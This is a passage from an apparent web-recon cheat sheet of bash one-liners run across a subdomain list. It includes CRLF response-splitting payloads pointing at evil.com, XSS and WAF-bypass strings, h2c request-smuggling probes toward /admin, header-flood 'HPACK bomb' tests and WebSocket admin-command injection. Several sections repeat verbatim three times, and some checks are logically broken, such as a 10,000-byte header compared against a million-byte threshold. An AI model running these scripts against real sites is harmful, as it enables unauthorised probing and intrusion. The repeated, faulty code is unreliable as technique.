            echo "⚠️ $url: Cookies missing Secure flag"
        fi
        
        # Check HttpOnly flag
        if ! echo "$cookies" | grep -q "HttpOnly"; then
            echo "⚠️ $url: Cookies missing HttpOnly flag"
        fi
        
        # Check SameSite
        if ! echo "$cookies" | grep -q "SameSite"; then
            echo "⚠️ $url: Cookies missing SameSite attribute"
        fi
        
        # Check for sensitive cookies
        if echo "$cookies" | grep -q "session\|token\|auth"; then
            cookie_name=$(echo "$cookies" | grep -o "session\|token\|auth" | head -1)
            echo "  → Sensitive cookie: $cookie_name"
        fi
    fi
done
```

## 29. **WebSocket Security Testing**
```bash
# Test WebSocket endpoints for security issues
cat subdomains.txt | httpx -silent -websocket -json | jq -r 'select(.["websocket-urls"]) | .url' |
while read url; do
    ws_url=$(echo "$url" | sed 's/https:/wss:/; s/http:/ws:/')
    
    # Test for unauthenticated access
    timeout 5 websocat "$ws_url" <<< '{"type":"ping"}' 2>/dev/null | grep -q "pong" &&
    echo "🔓 Unauthenticated WebSocket access at $ws_url"
    
    # Test for message injection
    test_msg='{"command":"admin","action":"list_users"}'
    response=$(timeout 5 websocat "$ws_url" <<< "$test_msg" 2>/dev/null)
    if echo "$response" | grep -q "user\|admin\|root"; then
        echo "  ⚠️ Command injection possible via WebSocket"
    fi
done
```

## 30. **HTTP/2 HPACK Bomb Detection**
```bash
# Check for HPACK bomb vulnerability (CVE-2021-3277)
cat subdomains.txt | httpx -silent -http2 | while read url; do
    # Create HPACK bomb payload
    bomb_header="x-test: $(python3 -c "print('A'*10000)")"
    
    response=$(curl -s -i -k --http2 -H "$bomb_header" -w "%{size_header}" "$url")
    
    if [ $? -eq 0 ]; then
        header_size=$(echo "$response" | wc -c)
        if [ $header_size -gt 1000000 ]; then
            echo "💣 HPACK bomb vulnerability at $url (header size: $header_size)"
        fi
    fi
done
```

## 31. **Open Graph Protocol Scraping for OSINT**
```bash
# Extract Open Graph metadata for OSINT
cat subdomains.txt | httpx -silent | while read url; do
    curl -s "$url" | grep -E '<meta property="og:[^"]+" content="[^"]+"' -o | 
    while read og_tag; do
        property=$(echo "$og_tag" | sed 's/.*property="og:\([^"]*\).*/\1/')
        content=$(echo "$og_tag" | sed 's/.*content="\([^"]*\).*/\1/')
        
        case $property in
            "title")
                echo "$url: Page title: $content" >> osint_data.txt
                ;;
            "description")
                echo "$url: Description: $content" >> osint_data.txt
                ;;
            "image")
                echo "$url: Image: $content" >> osint_data.txt
                # Download image for analysis
                curl -s "$content" -o "images/$(basename $content)"
                ;;
            "email")
                echo "📧 Email found: $content at $url" >> osint_data.txt
                ;;
        esac
    done
    
    # Extract additional metadata
    curl -s "$url" | grep -E '<meta name="twitter:[^"]+" content="[^"]+"' -o >> osint_data.txt
done
```

## 32. **HTTP/3 Early Adoption Detection**
```bash
# Identify early adopters of HTTP/3
cat subdomains.txt | httpx -silent -http3 -json | jq -r 'select(.["http3"]) | .url' |
while read url; do
    echo "🚀 HTTP/3 enabled: $url"
    
    # Get HTTP/3 implementation details
    alt_svc=$(curl -s -I --http3 "$url" 2>/dev/null | grep -i "alt-svc")
    if [ ! -z "$alt_svc" ]; then
        echo "  ALTSVC: $alt_svc"
        
        # Check for QUIC version
        if echo "$alt_svc" | grep -q "h3-29\|h3-30\|h3-31"; then
            echo "  Using bleeding-edge HTTP/3 draft"
        fi
    fi
done
```

## 33. **Broken Link Detection for SEO**
```bash
# Find broken links for SEO optimization
cat subdomains.txt | httpx -silent | while read url; do
    curl -s "$url" | grep -E 'href="([^"]+)"' -o | sed 's/href="//; s/"//' | 
    while read link; do
        # Normalize link
        if [[ "$link" == http* ]]; then
            full_link="$link"
        elif [[ "$link" == /* ]]; then
            full_link="${url}${link}"
        else
            full_link="${url}/${link}"
        fi
        
        # Check if link is broken
        status=$(curl -s -o /dev/null -w "%{http_code}" "$full_link")
        if [ "$status" == "404" ]; then
            echo "🔗 Broken link on $url: $full_link (404)"
        elif [ "$status" == "500" ]; then
            echo "🔗 Server error on $url: $full_link (500)"
        fi
    done
done
```

## 34. **HTTP Request Smuggling via WebSocket Upgrade**
```bash
# Test for request smuggling via WebSocket upgrade
cat subdomains.txt | httpx -silent -websocket | while read url; do
    # Create smuggled request
    payload="GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
    
    response=$(curl -s -i -k -H "Connection: Upgrade, HTTP2-Settings" \
        -H "Upgrade: h2c" \
        -H "HTTP2-Settings: $payload" \
        "$url")
    
    if echo "$response" | grep -q "200 OK\|Admin"; then
        echo "🚨 WebSocket upgrade smuggling at $url"
    fi
done
```

## 35. **Cache Timing Side-Channel Analysis**
```bash
# Detect cache timing side-channels
cat subdomains.txt | httpx -silent | while read url; do
    # First request - should miss cache
    time1=$(curl -s -o /dev/null -w "%{time_total}" "$url/sensitive")
    
    sleep 1
    
    # Second request - might hit cache
    time2=$(curl -s -o /dev/null -w "%{time_total}" "$url/sensitive")
    
    # Calculate difference
    diff=$(echo "$time1 - $time2" | bc)
    
    if (( $(echo "$diff > 0.1" | bc -l) )); then
        echo "⏱️ Cache timing difference at $url/sensitive: ${diff}s"
        
        # Test if we can use this to detect existence
        time_exists=$time2
        
        # Test non-existent resource
        time_missing=$(curl -s -o /dev/null -w "%{time_total}" "$url/nonexistent123")
        
        diff_exists=$(echo "$time_exists - $time_missing" | bc)
        if (( $(echo "$diff_exists > 0.1" | bc -l) )); then
            echo "  ✅ Can detect existence of sensitive resources via timing"
        fi
    fi
done
```

## 36. **HTTP Response Splitting Detection**
```bash
# Find HTTP response splitting vulnerabilities
cat subdomains.txt | httpx -silent | while read url; do
    # Inject CRLF in parameter
    response=$(curl -s -i -k "$url?test=123%0d%0aLocation:%20http://evil.com%0d%0a")
    
    if echo "$response" | grep -q "evil.com"; then
        echo "🚨 HTTP Response Splitting at $url"
        
        # Test for cache poisoning
        cache_response=$(curl -s -I -k "$url?test=123%0d%0aLocation:%20http://evil.com%0d%0a" | grep -i "x-cache:")
        if echo "$cache_response" | grep -q "HIT"; then
            echo "  ⚠️ Cache poisoning possible"
        fi
    fi
done
```

## 37. **Web Application Firewall (WAF) Fingerprinting**
```bash
# Fingerprint WAF solutions
cat subdomains.txt | httpx -silent | while read url; do
    # Send malicious payload to trigger WAF
    response=$(curl -s -i -k "$url?q=<script>alert(1)</script>")
    
    # Check for WAF signatures
    if echo "$response" | grep -q "cloudflare\|cf-ray"; then
        echo "🛡️ Cloudflare detected on $url"
    elif echo "$response" | grep -q "akamai\|akamaighost"; then
        echo "🛡️ Akamai detected on $url"
    elif echo "$response" | grep -q "incapsula\|X-Iinfo"; then
        echo "🛡️ Incapsula detected on $url"
    elif echo "$response" | grep -q "f5\|BIG-IP"; then
        echo "🛡️ F5 BIG-IP detected on $url"
    elif [ "$(echo "$response" | head -1 | cut -d' ' -f2)" == "406" ]; then
        echo "🛡️ WAF blocking (406) on $url - possible ModSecurity"
    fi
    
    # Test WAF bypass techniques
    bypass_payload="<scr<script>ipt>alert(1)</scr</script>ipt>"
    bypass_response=$(curl -s -o /dev/null -w "%{http_code}" -k "$url?q=$bypass_payload")
    
    if [ "$bypass_response" == "200" ]; then
        echo "  ⚠️ WAF bypass possible with obfuscation"
    fi
done
```

## 38. **HTTP/2 HPACK Bomb Detection**
```bash
# Check for HPACK bomb vulnerability (CVE-2021-3277)
cat subdomains.txt | httpx -silent -http2 | while read url; do
    # Create HPACK bomb payload
    bomb_header="x-test: $(python3 -c "print('A'*10000)")"
    
    response=$(curl -s -i -k --http2 -H "$bomb_header" -w "%{size_header}" "$url")
    
    if [ $? -eq 0 ]; then
        header_size=$(echo "$response" | wc -c)
        if [ $header_size -gt 1000000 ]; then
            echo "💣 HPACK bomb vulnerability at $url (header size: $header_size)"
        fi
    fi
done
```

## 39. **Open Graph Protocol Scraping for OSINT**
```bash
# Extract Open Graph metadata for OSINT
cat subdomains.txt | httpx -silent | while read url; do
    curl -s "$url" | grep -E '<meta property="og:[^"]+" content="[^"]+"' -o | 
    while read og_tag; do
        property=$(echo "$og_tag" | sed 's/.*property="og:\([^"]*\).*/\1/')
        content=$(echo "$og_tag" | sed 's/.*content="\([^"]*\).*/\1/')
        
        case $property in
            "title")
                echo "$url: Page title: $content" >> osint_data.txt
                ;;
            "description")
                echo "$url: Description: $content" >> osint_data.txt
                ;;
            "image")
                echo "$url: Image: $content" >> osint_data.txt
                # Download image for analysis
                curl -s "$content" -o "images/$(basename $content)"
                ;;
            "email")
                echo "📧 Email found: $content at $url" >> osint_data.txt
                ;;
        esac
    done
    
    # Extract additional metadata
    curl -s "$url" | grep -E '<meta name="twitter:[^"]+" content="[^"]+"' -o >> osint_data.txt
done
```

## 40. **HTTP/3 Early Adoption Detection**
```bash
# Identify early adopters of HTTP/3
cat subdomains.txt | httpx -silent -http3 -json | jq -r 'select(.["http3"]) | .url' |
while read url; do
    echo "🚀 HTTP/3 enabled: $url"
    
    # Get HTTP/3 implementation details
    alt_svc=$(curl -s -I --http3 "$url" 2>/dev/null | grep -i "alt-svc")
    if [ ! -z "$alt_svc" ]; then
        echo "  ALTSVC: $alt_svc"
        
        # Check for QUIC version
        if echo "$alt_svc" | grep -q "h3-29\|h3-30\|h3-31"; then
            echo "  Using bleeding-edge HTTP/3 draft"
        fi
    fi
done
```

## 41. **Broken Link Detection for SEO**
```bash
# Find broken links for SEO optimization
cat subdomains.txt | httpx -silent | while read url; do
    curl -s "$url" | grep -E 'href="([^"]+)"' -o | sed 's/href="//; s/"//' | 
    while read link; do
        # Normalize link
        if [[ "$link" == http* ]]; then
            full_link="$link"
        elif [[ "$link" == /* ]]; then
            full_link="${url}${link}"
        else
            full_link="${url}/${link}"
        fi
        
        # Check if link is broken
        status=$(curl -s -o /dev/null -w "%{http_code}" "$full_link")
        if [ "$status" == "404" ]; then
            echo "🔗 Broken link on $url: $full_link (404)"
        elif [ "$status" == "500" ]; then
            echo "🔗 Server error on $url: $full_link (500)"
        fi
    done
done
```

## 42. **HTTP Request Smuggling via WebSocket Upgrade**
```bash
# Test for request smuggling via WebSocket upgrade
cat subdomains.txt | httpx -silent -websocket | while read url; do
    # Create smuggled request
    payload="GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
    
    response=$(curl -s -i -k -H "Connection: Upgrade, HTTP2-Settings" \
        -H "Upgrade: h2c" \
        -H "HTTP2-Settings: $payload" \
        "$url")
    
    if echo "$response" | grep -q "200 OK\|Admin"; then
        echo "🚨 WebSocket upgrade smuggling at $url"
    fi
done
```

## 43. **Cache Timing Side-Channel Analysis**
```bash
# Detect cache timing side-channels
cat subdomains.txt | httpx -silent | while read url; do
    # First request - should miss cache
    time1=$(curl -s -o /dev/null -w "%{time_total}" "$url/sensitive")
    
    sleep 1
    
    # Second request - might hit cache
    time2=$(curl -s -o /dev/null -w "%{time_total}" "$url/sensitive")
    
    # Calculate difference
    diff=$(echo "$time1 - $time2" | bc)
    
    if (( $(echo "$diff > 0.1" | bc -l) )); then
        echo "⏱️ Cache timing difference at $url/sensitive: ${diff}s"
        
        # Test if we can use this to detect existence
        time_exists=$time2
        
        # Test non-existent resource
        time_missing=$(curl -s -o /dev/null -w "%{time_total}" "$url/nonexistent123")
        
        diff_exists=$(echo "$time_exists - $time_missing" | bc)
        if (( $(echo "$diff_exists > 0.1" | bc -l) )); then
            echo "  ✅ Can detect existence of sensitive resources via timing"
        fi
    fi
done
```

## 44. **HTTP Response Splitting Detection**
```bash
# Find HTTP response splitting vulnerabilities
cat subdomains.txt | httpx -silent | while read url; do
    # Inject CRLF in parameter
    response=$(curl -s -i -k "$url?test=123%0d%0aLocation:%20http://evil.com%0d%0a")
    
    if echo "$response" | grep -q "evil.com"; then
        echo "🚨 HTTP Response Splitting at $url"
        
        # Test for cache poisoning
        cache_response=$(curl -s -I -k "$url?test=123%0d%0aLocation:%20http://evil.com%0d%0a" | grep -i "x-cache:")
        if echo "$cache_response" | grep -q "HIT"; then
            echo "  ⚠️ Cache poisoning possible"
        fi
    fi
done
```

## 45. **Web Application Firewall (WAF) Fingerprinting**
```bash
# Fingerprint WAF solutions
cat subdomains.txt | httpx -silent | while read url; do
    # Send malicious payload to trigger WAF
    response=$(curl -s -i -k "$url?q=<script>alert(1)</script>")
    
    # Check for WAF signatures
    if echo "$response" | grep -q "cloudflare\|cf-ray"; then
        echo "🛡️ Cloudflare detected on $url"
    elif echo "$response" | grep -q "akamai\|akamaighost"; then
        echo "🛡️ Akamai detected on $url"
    elif echo "$response" | grep -q "incapsula\|X-Iinfo"; then
        echo "🛡️ Incapsula detected on $url"
    elif echo "$response" | grep -q "f5\|BIG-IP"; then
        echo "🛡️ F5 BIG-IP detected on $url"
    elif [ "$(echo "$response" | head -1 | cut -d' ' -f2)" == "406" ]; then
        echo "🛡️ WAF blocking (406) on $url - possible ModSecurity"
    fi
    
    # Test WAF bypass techniques
    bypass_payload="<scr<script>ipt>alert(1)</scr</script>ipt>"
    bypass_response=$(curl -s -o /dev/null -w "%{http_code}" -k "$url?q=$bypass_payload")
    
    if [ "$bypass_response" == "200" ]; then
        echo "  ⚠️ WAF bypass possible with obfuscation"
    fi
done
```

## 46. **HTTP/2 HPACK Bomb Detection**
```bash
# Check for HPACK bomb vulnerability (CVE-2021-3277)
cat subdomains.txt | httpx -silent -http2 | while read url; do
    # Create HPACK bomb payload
    bomb_header="x-test: $(python3 -c "print('A'*10000)")"
    
    response=$(curl -s -i -k --http2 -H "$bomb_header" -w "%{size_header}" "$url")
    
    if [ $? -eq 0 ]; then
        header_size=$(echo "$response" | wc -c)
        if [ $header_size -gt 1000000 ]; then
            echo "💣 HPACK bomb vulnerability at $url (header size: $header_size)"
        fi
    fi
done
```

## 47. **Open Graph Protocol Scraping for OSINT**
```bash
# Extract Open Graph metadata for OSINT
cat subdomains.txt | httpx -silent | while read url; do
    curl -s "$url" | grep -E '<meta property="og:[^"]+" content="[^"]+"' -o | 
    while read og_tag; do
        property=$(echo "$og_tag" | sed 's/.*property="og:\([^"]*\).*/\1/')
        content=$(echo "$og_tag" | sed 's/.*content="\([^"]*\).*/\1/')
        
        case $property in
            "title")
                echo "$url: Page title: $content" >> osint_data.txt
                ;;
            "description")
                echo "$url: Description: $content" >> osint_data.txt
                ;;
            "image")
                echo "$url: Image: $content" >> osint_data.txt
                # Download image for analysis
                curl -s "$content" -o "images/$(basename $content)"
                ;;
            "email")
                echo "📧 Email found: $content at $url" >> osint_data.txt
                ;;
        esac
    done
    
    # Extract additional metadata
    curl -s "$url" | grep -E '<meta name="twitter:[^"]+" content="[^"]+"' -o >> osint_data.txt
done
```

## 48. **HTTP/3 Early Adoption Detection**
```bash
# Identify early adopters of HTTP/3
cat subdomains.txt | httpx -silent -http3 -json | jq -r 'select(.["http3"]) | .url' |
while read url; do
    echo "🚀 HTTP/3 enabled: $url"
    
    # Get HTTP/3 implementation details
    alt_svc=$(curl -s -I --http3 "$url" 2>/dev/null | grep -i "alt-svc")
    if [ ! -z "$alt_svc" ]; then
        echo "  ALTSVC: $alt_svc"
        
        # Check for QUIC version
        if echo "$alt_svc" | grep -q "h3-29\|h3-30\|h3-31"; then
            echo "  Using bleeding-edge HTTP/3 draft"
        fi
    fi
done
```

## 49. **Broken Link Detection for SEO**
```bash
# Find broken links for SEO optimization
cat subdomains.txt | httpx -silent | while read url; do
    curl -s "$url" | grep -E 'href="([^"]+)"' -o | sed 's/href="//; s/"//' | 
    while read link; do
        # Normalize link
        if [[ "$link" == http* ]]; then
            full_link="$link"
        elif [[ "$link" == /* ]]; then
            full_link="${url}${link}"
        else
            full_link="${url}/${link}"
        fi
        
        # Check if link is broken
        status=$(curl -s -o /dev/null -w "%{http_code}" "$full_link")
        if [ "$status" == "404" ]; then
            echo "🔗 Broken link on $url: $full_link (404)"
        elif [ "$status" == "500" ]; then
            echo "🔗 Server error on $url: $full_link (500)"
        fi
    done
done
```

## 50. **HTTP Request Smuggling via WebSocket Upgrade**
```bash
# Test for request smuggling via WebSocket upgrade
cat subdomains.txt | httpx -silent -websocket | while read url; do
    # Create smuggled request
    payload="GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
    
    response=$(curl -s -i -k -H "Connection: Upgrade, HTTP2-Settings" \
        -H "Upgrade: h2c" \
        -H "HTTP2-Settings: $payload" \
        "$url")
    
    if echo "$response" | grep -q "200 OK\|Admin"; then
        echo "🚨 WebSocket upgrade smuggling at $url"
    fi
done
```

